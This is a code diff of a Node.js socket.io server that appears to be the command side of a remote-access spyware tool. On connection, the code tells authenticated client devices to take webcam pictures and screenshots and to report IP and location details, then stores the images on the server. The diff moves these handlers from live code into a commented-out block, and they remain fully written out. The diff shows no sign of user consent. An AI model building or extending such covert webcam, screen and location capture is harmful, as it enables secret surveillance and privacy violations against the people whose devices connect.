@@ -15,6 +15,8 @@ var routes = require('./routes/router');
 var User = require('./models/user');
 var Device = require('./models/device');
 
+app.io = io;
+
 const PORT = 3000;
 
 // connect to MongoDB
@@ -66,7 +68,7 @@ function client_authentication(app_id, device_id, socket_id, callback) {
                 
             }
             device.socketId = socket_id;
-            device.connected = true;
+            device.connected = 'online';
             device.save(function(err) {
                 if(err) { return callback(err, false); }
                 
@@ -89,6 +91,52 @@ io.on('connection', function(socket) {
             if(!err && success) {
                 console.log("\nAuthenticated socket ", socket.id, '\n');
                 socket.auth = true;
+                socket.emit('authorized','');
+                
+                /** CONSIDER MOVING THIS **/
+                
+                /* socket.on('client_error', function(data) {
+                    console.log("\n******ERROR SENT FROM CLIENT******")
+                    Object.getOwnPropertyNames(data).forEach(
+                    function(val, idx, arr) {
+                        console.log(val + ' -> ' + data[val]);
+                    });
+                    console.log("**********************************\n")
+                });
+                
+
+                socket.emit('take_webcam_picture', '');
+
+                
+                socket.on('send_webcam_picture', function(data) {
+                    fs.writeFile(__dirname + '/uploads/' + 'webcam.jpg', data.buffer, 'base64', function(err) {
+                        if(err){console.log(err);}
+                    });
+                });
+                
+                socket.emit('take_screenshot', '');
+
+                socket.on('send_screenshot', function(data) {
+                    fs.writeFile(__dirname + '/uploads/' + 'screenshot.jpg', data.buffer, 'base64', function(err) {
+                        if(err){console.log(err);}
+                    });
+                });
+                
+                socket.emit('get_ip_info', '');
+                
+                socket.on('send_ip_info', function(data) {
+                    console.log(data);
+                    var client_ip = data.ip;
+                    var client_org = data.org;
+                    var client_city = data.city;
+                    var client_country = data.country;
+                    var client_region = data.region;
+                    
+                    console.log("CLIENT IP DETAILS\n ");
+                    //console.log(client_ip, client_org, client_city, client_country, client_region);
+                }); */
+                
+                /** CONSIDER MOVING THIS **/
             }
         });
     });
@@ -97,39 +145,11 @@ io.on('connection', function(socket) {
         // If socket did not authenticate, disconnect it 
         if(!socket.auth) {
             console.log("\nDisconnecting socket ", socket.id, '\n');
-            socket.disconnect('unauthorized');
+            socket.emit('unauthorized', '');
         } 
     }, 1000);
     
-    socket.on('client_error', function(data) {
-        console.log("\n******ERROR SENT FROM CLIENT******")
-        Object.getOwnPropertyNames(data).forEach(
-        function(val, idx, arr) {
-            console.log(val + ' -> ' + data[val]);
-        });
-        console.log("**********************************\n")
-    });
     
-    // TODO: Make functional with windows
-    socket.emit('take_webcam_picture', '');
-
-    ss(socket).on('send_webcam_picture', function(stream, data) {
-        var filename = path.basename(data.name);
-        var localPath = __dirname + '/uploads/' + filename;
-        console.log(filename);
-        console.log(localPath);
-        stream.pipe(fs.createWriteStream(localPath));
-    });
-    
-    socket.emit('take_screenshot', '');
-    
-    ss(socket).on('send_screenshot', function(stream, data) {
-        var filename = path.basename(data.name);
-        var localPath = __dirname + '/uploads/' + filename;
-        console.log(filename);
-        console.log(localPath);
-        stream.pipe(fs.createWriteStream(localPath));
-    });
 });
 
 // catch 404 and forward to error handler
